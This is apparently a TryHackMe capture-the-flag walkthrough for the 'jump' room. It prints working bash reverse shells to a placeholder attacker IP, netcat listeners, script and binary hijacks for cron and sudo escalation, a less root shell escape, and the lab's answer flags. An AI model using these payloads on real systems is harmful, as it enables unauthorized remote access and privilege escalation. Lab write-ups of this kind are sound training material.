# [jump](https://tryhackme.com/room/jump)

## setup

- create a **jump** folder, `cd` in the folder
- connect to the target machine

```bash
ftp targetIp
```

- `anonymous:anonymous`
- new terminal tab in **jump**
- create an `reverse.sh` file

---

```sh
#!/bin/bash

sh -i >& /dev/tcp/attackerIp/4444 0>&1
```

- `sh -i` -> starts an interactive shell, `-i` -> interactive
- `/dev/tcp/attackerIp/4444` -> opens a network connection to your attack machine on port 4444
- `>&` -> redirects both **stdout (1)** and **stderr (2)** to whatever follows, to the socket
- `0>&1` -> redirect input from the socket, since stdout is already the socket, stdin becomes the socket too, now the shell reads commands from the network

---

- start a listener on the attack machine:

```
nc -lnvp 4444
```

---

- `nc` -> netcat
- `-l` -> listen
- `-v` -> verbose (show connection info)
- `-n` -> don't resolve DNS
- `-p 4444` -> listen on port 4444
- this starts to listen on port 4444

---

- on the ftp server move to the `/incoming` folder
- copy the `reverse.sh`

```bash
put reverse.sh
```

- only works if the ftp was started from the folder where the `reverse.sh` is
- go to the listener
- it should be connected
- list the folder content `ls -la`
- there should be the first flag

## recon user

> What is the flag found in the recon_user’s home directory?

```
THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}
```

## dev_user check

- upgrading the shell (shell stabilisation)

---

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- `python3 -c '...'` -> run this Python code inline
- `import pty` -> load Python's pseudo-terminal module
- `pty.spawn("/bin/bash")` -> launch bash attached to a fake terminal (a PTY)

> shell thinks it's a real terminal, gives a proper prompt and tools like sudo

---

- hit `ctrl+z` -> it will background the listener, then

---

```bash
stty raw -echo; fg
```

- `stty raw` -> passes keystrokes straight through (so Ctrl+C, arrows, etc. reach the target instead of your local machine)
- `-echo` -> stops your local terminal from double-printing what you type
- `;` -> command separator
- `fg` -> foregrounds the backgrounded shell, this is a separate command

---

- type `export TERM=xterm`, enter
- arrived back to the reverse shell
- move up in the folder
- list the content `ls -la`
- move into the `dev_user` folder
- list the content `ls -la`
- cat the flag

> What is the flag found in the dev_user’s home directory?

```
THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
```

## dev_user escalation

- got to `/opt`
- `/opt` is the standard Linux folder for optional / add-on software
- anything in `/opt` was deliberately put there, it's a hotspot for PrivEsc (privilege escalation)
- there is a `/app`, `/dev`, `/recon` folder, go to the `/dev`
- in the dev there is a `backup.sh` file
- check the `backup.sh` file `ls -la backup.sh`

```bash
-rwxrwxr-x 1 dev_user dev_user 60 Jun  9 09:03 backup.sh
```

```
-      rwx      rwx      r-x
type   owner    group    others
```

- whoever in the **dev_user** group can write the file
- check the **recon_user** `id`

```bash
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
```

- the **recon_user** is part of the **dev_user** group
- edit the `backup.sh`
- `nano backup.sh`

```sh
#!/bin/bash
#tar -czf /tmp/recon_backup.tgz /home/recon_user
bash -i >& /dev/tcp/attackerIp/4545 0>&1
```

> `bash` vs `sh` -> bash is more feature rich

- probably the `backup.sh` been run by the **dev_user** as a **cronjob**
- create a listener on the port `4545`

```bash
nc -lnvp 4545
```

- after a minute the reverse shell will let you in as **dev_user**
- upgrade the terminal

## monitor_user escalation

- check with `sudo -l` the if it needs password
- check the `/opt/dev/bin` folder
- there is a file called `ps`
- probably the `monitor_user`'s `ps` got hijacked already (thm help)
- `monitor_user` probably calls `ps` regularly
- lets check it out

```bash
ls -la ps
-rw-rw-r-- 1 dev_user dev_user 62 Apr 26 18:19 ps
```

- it can be modified by the **dev_user**

```bash
#!/bin/bash
bash -i >& /dev/tcp/attackerIp/4646 0>&1
```

- make the `ps` executable

```bash
chmod +x ps
```

- start a listener on port `4646`
- after a minute the reverse shell will let you in as **monitor_user**
- upgrade the terminal
- move to the user folder `cd ~`
- `cat` the `flag.txt`

> What is the flag found in the monitor_user’s home directory?

```
THM{c1e9a7b3-2d44-4a88-9f7e-3b6c2d5a9f77}
```

## ops_user escalation

- check `sudo -l`

```bash
Matching Defaults entries for monitor_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

- the `monitor_user` can run the `/usr/local/bin/deploy.sh` as `ops_user`
- if the `/usr/local/bin/deploy.sh` can be modified to be a reverse shell, it can "call home"
- lets check the `/usr/local/bin/deploy.sh`

```sh
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

- can the monitor_user modify it? (nope)

```bash
ls -la deploy.sh
-rwxr-xr-x 1 ops_user ops_user 55 Feb  2  2026 deploy.sh
```

- but maybe the `./deploy_helper.sh` would do the "call home"

```bash
ls -la
-rwxr-xr-x 1 monitor_user monitor_user 90 Feb  2  2026 deploy_helper.sh
```

- this can be modified

> next goal

- creating a reverse shell from the `deploy_helper.sh`
- create a listener for this reverse shell
- call the `deploy.sh` with the `monitor_user` as `ops_user`

- reverse shell

```sh
#!/bin/bash
#echo "[+] Deploy helper running"
#echo "[+] Syncing application files"
#sleep 2

bash -i >& /dev/tcp/attackerIp/4747 0>&1
```

- listener on the attack machine

```bash
nc -lnvp 4747
```

- call the deploy.sh

---

```bash
sudo -u ops_user /usr/local/bin/deploy.sh
```

- `sudo` -> run a command as another user
- `-u ops_user` -> specifically as `ops_user` (not root, which is sudo's default)
- `/usr/local/bin/deploy.sh` -> the path to the script

---

- under the listener the reverse shell should have worked
- check the `ops_user` folder for the flag

> What is the flag found in the ops_user’s home directory?

```
THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}
```

- upgrade terminal

## root escalation

---

- run `sudo -l`

```bash
Matching Defaults entries for ops_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS
User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

- `(root) NOPASSWD: /usr/bin/less` lets `ops_user` can run `less` as `root`
- the `env_keep+=LESS` line means sudo preserves your LESS environment variable into that root less session (normally `env_reset` would strip it)

---

- run `less` on anything as `root`

```bash
sudo less /etc/profile
```

- type `!/bin/bash`
- should give `root` priv
- check for the root flag

> What is the flag found in the root user's home directory?

```
THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}
```
